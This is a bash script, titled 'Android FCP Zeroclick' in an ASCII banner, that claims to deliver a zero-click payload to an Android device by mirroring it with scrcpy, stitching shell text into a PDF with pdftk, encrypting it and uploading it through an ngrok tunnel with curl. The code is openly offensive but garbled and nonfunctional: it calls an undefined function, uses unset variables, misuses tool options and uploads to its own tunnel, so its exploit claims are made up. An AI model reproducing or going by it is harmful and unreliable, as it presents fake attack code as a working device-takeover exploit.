#!/bin/bash
echo "
 █████╗ ███╗   ██╗██████╗ ██████╗  ██████╗ ██╗██████╗     ███████╗ ██████╗██████╗     ███████╗███████╗██████╗  ██████╗  ██████╗██╗     ██╗ ██████╗██╗  ██╗
██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔═══██╗██║██╔══██╗    ██╔════╝██╔════╝██╔══██╗    ╚══███╔╝██╔════╝██╔══██╗██╔═══██╗██╔════╝██║     ██║██╔════╝██║ ██╔╝
███████║██╔██╗ ██║██║  ██║██████╔╝██║   ██║██║██║  ██║    █████╗  ██║     ██████╔╝      ███╔╝ █████╗  ██████╔╝██║   ██║██║     ██║     ██║██║     █████╔╝ 
██╔══██║██║╚██╗██║██║  ██║██╔══██╗██║   ██║██║██║  ██║    ██╔══╝  ██║     ██╔═══╝      ███╔╝  ██╔══╝  ██╔══██╗██║   ██║██║     ██║     ██║██║     ██╔═██╗ 
██║  ██║██║ ╚████║██████╔╝██║  ██║╚██████╔╝██║██████╔╝    ██║     ╚██████╗██║         ███████╗███████╗██║  ██║╚██████╔╝╚██████╗███████╗██║╚██████╗██║  ██╗
╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝╚═════╝     ╚═╝      ╚═════╝╚═╝         ╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝╚══════╝╚═╝ ╚═════╝╚═╝  ╚═╝
"

# This script mirrors an Android device using scrcpy and delivers the payload in a fragmented PDF file.

# Usage:
# ./android_fcp_zeroclick.sh <android_device_ip> <pdf_file_1> <pdf_file_2>

# Variables
android_device_ip=$1
pdf_payload_part_1=$2
pdf_payload_part_2=$3
ngrok_tunnel_url=$(ngrok status | grep "Forwarding" | awk '{print $2}')
command_file="/tmp/command.txt"
fragmented_pdf_payload="/tmp/fragmented_pdf_payload"

# Functions
function mirror_android_device() {
  # Get the IP address of the Android device
  android_device_ip="$1"

  # Check if the Android device is reachable
  if [[ ! $(ping -c 1 $android_device_ip) ]]; then
    echo "Error: Android device is not reachable."
    exit 1
  fi

  # Start a scrcpy session with the Android device
  scrcpy -d "$android_device_ip" --background --auto-connect yes
}

function generate_pdf_payload() {
  # Combine the two PDF files into one
  pdftk "$pdf_payload_part_1" "$pdf_payload_part_2" output "$fragmented_pdf_payload"

  # Add the scrcpy command to the PDF payload
  pdftk "$fragmented_pdf_payload" insert "scrcpy -d $(get_device_id) --background --auto-connect yes" output "$fragmented_pdf_payload"
}

function encrypt_pdf_payload() {
  # Encrypt the PDF payload with AES-256
  openssl aes-256-cbc -salt -in "$fragmented_pdf_payload" -out "$fragmented_pdf_payload.enc" -k "password"
}

function cleanup() {
  # Delete the temporary files
  rm -f "$command_file" "$fragmented_pdf_payload" "$fragmented_pdf_payload.enc"
}

# Check if all the required dependencies are installed
if [[ ! $(command -v ngrok) ]]; then
  echo "Error: ngrok is not installed."
  exit 1
fi

if [[ ! $(command -v pdftk) ]]; then
  echo "Error: pdftk is not installed."
  exit 1
fi

if [[ ! $(command -v openssl) ]]; then
  echo "Error: openssl is not installed."
  exit 1
fi

# Start the ngrok tunnel
ngrok start 80

# Generate the PDF payload
generate_pdf_payload

# Encrypt the PDF payload
encrypt_pdf_payload

# Save the scrcpy command to a file
echo "scrcpy -d $android_device_id --background --auto-connect yes" > "$command_file"

# Deliver the PDF payload to the target
curl -F "file=@$fragmented_pdf_payload.enc" $ngrok_tunnel_url/upload

# Cleanup
cleanup
